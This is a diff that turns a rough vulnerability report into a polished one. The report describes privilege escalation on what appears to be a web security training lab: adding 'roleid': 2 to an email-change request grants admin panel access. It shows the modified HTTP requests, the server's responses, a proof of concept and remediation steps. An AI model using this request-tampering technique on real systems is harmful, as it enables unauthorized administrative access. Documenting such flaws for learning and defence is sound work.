@@ -1,51 +1,130 @@
-Title: privilege escalation to get admin panel acces.
-Summary: 
+# Title: Privilege Escalation to Gain Admin Panel Access
 
-Discovery Process:
-I tryed to do actions in the account, and chack the request to see if there is a parameters i can change, to get acces to the admin panel.
-When i change my email addres i sow the response send more parameters that wasn't in the original request.
-One of them was the parameter:'role'. It modifying to '1'.
-When i change it to '1' i get acces to the admin panel!
+## Summary:
 
-Exploitation:
-I tested modifying the parameter 'role' identifier by modifying the request manually:
+A Broken Access Control vulnerability allows a regular user to escalate their privileges to an administrative role by modifying the `roleid` parameter in the request used to change their email address.
 
-Original request:
+The server exposes sensitive account parameters in the response, including the user's `roleid`. By adding and modifying this parameter in the request, a regular user can change their role and gain unauthorized access to the admin panel.
+
+## Discovery Process:
+
+I tested various actions within the user account and inspected the corresponding HTTP requests and responses to identify parameters that could potentially be modified to gain access to the admin panel.
+
+While testing the email change functionality, I noticed that the server response contained additional parameters that were not included in the original request.
+
+One of the exposed parameters was `roleid`, which represented the user's current role.
+
+I then tested whether this parameter could be modified by manually adding it to the request and changing its value from `1` to `2`.
+
+The server accepted the modified value and successfully changed the user's role. As a result, I gained access to the admin panel.
+
+## Exploitation:
+
+I tested modifying the `roleid` parameter manually.
+
+**Original request:**
+
+```http
 POST /my-account/change-email HTTP/2
 Host: 0a8200ad043e8d398041c251003b00b9.web-security-academy.net
 ...
+
 {
-"email":"secCheck@gmail.com"
+  "email": "secCheck@gmail.com"
 }
+```
 
-Modified request:
+**Modified request:**
+
+```http
 POST /my-account/change-email HTTP/2
 Host: 0a8200ad043e8d398041c251003b00b9.web-security-academy.net
 ...
+
 {
-  "username": <"USER_NAME">,
+  "username": "<USER_NAME>",
   "email": "secCheck@gmail.com",
-  "apikey":<"API_KEY">,
+  "apikey": "<API_KEY>",
   "roleid": 2
 }
+```
 
-The server responded with 302 Found, and the role was successfully modifinding to '2'.
+The server responded with `HTTP/2 302 Found`, and the user's role was successfully modified to `2`.
 
-Impact:
-The user have acces to the admin panel now!
+After the role was modified, I was able to access the admin panel.
 
-Root Cause:
-The web trust the user request and dont chack the user is how he say he is, and is permissions are leagals.
+## Impact:
 
-Proof of Concept
-POST /my-account/change-email HTTP/2 {"email":"secCheck@gmail.com"} 
-→ HTTP/2 302 Found
-{"username": <"">,"email": <"">,"apikey": <"">,"roleid": 1}
-POST /my-account/change-email HTTP/2 {"username": <"">,"email": <"">,"apikey": <"">,"roleid": 2}
-→ HTTP/2 302 Found
-{"username": <"">,"email": <"">,"apikey": <"">,"roleid": 2}
+A regular user can escalate their privileges to an administrative role and gain unauthorized access to the admin panel.
 
-Remediation:
-Modifaying all the user that have permission to the admin panel,
-and in evry acount action the server-side checks for every user request,if is parameters much is permisions.
+This may allow an attacker to access sensitive information, modify application data, manage users, or perform other administrative actions, depending on the functionality available within the admin panel.
 
+## Root Cause:
+
+The root cause is a Broken Access Control vulnerability caused by insufficient server-side authorization checks and improper handling of user-controlled parameters.
+
+The application trusts the `roleid` value supplied by the client instead of determining and enforcing the user's role on the server side.
+
+The server does not verify whether the authenticated user is authorized to modify sensitive authorization-related parameters such as their own role.
+
+## Proof of Concept:
+
+**Step 1 – Original request:**
+
+```http
+POST /my-account/change-email HTTP/2
+
+{
+  "email": "secCheck@gmail.com"
+}
+```
+
+**Response:**
+
+```http
+HTTP/2 302 Found
+
+{
+  "username": "<USER_NAME>",
+  "email": "<EMAIL>",
+  "apikey": "<API_KEY>",
+  "roleid": 1
+}
+```
+
+**Step 2 – Modified request:**
+
+```http
+POST /my-account/change-email HTTP/2
+
+{
+  "username": "<USER_NAME>",
+  "email": "secCheck@gmail.com",
+  "apikey": "<API_KEY>",
+  "roleid": 2
+}
+```
+
+**Response:**
+
+```http
+HTTP/2 302 Found
+
+{
+  "username": "<USER_NAME>",
+  "email": "<EMAIL>",
+  "apikey": "<API_KEY>",
+  "roleid": 2
+}
+```
+
+**Result:** The user's `roleid` was successfully changed from `1` to `2`, granting access to the admin panel.
+
+## Remediation:
+
+* Do not allow users to modify sensitive authorization-related parameters such as `roleid`.
+* Perform authorization checks on the server side for every request.
+* Determine the user's role from a trusted server-side source instead of accepting it from the client.
+* Implement an allowlist of parameters that users are permitted to modify.
+* Ensure that account-management endpoints cannot be used to modify privileged attributes such as roles or permissions.
+* Review existing user accounts and verify that administrative privileges are assigned only to authorized users.
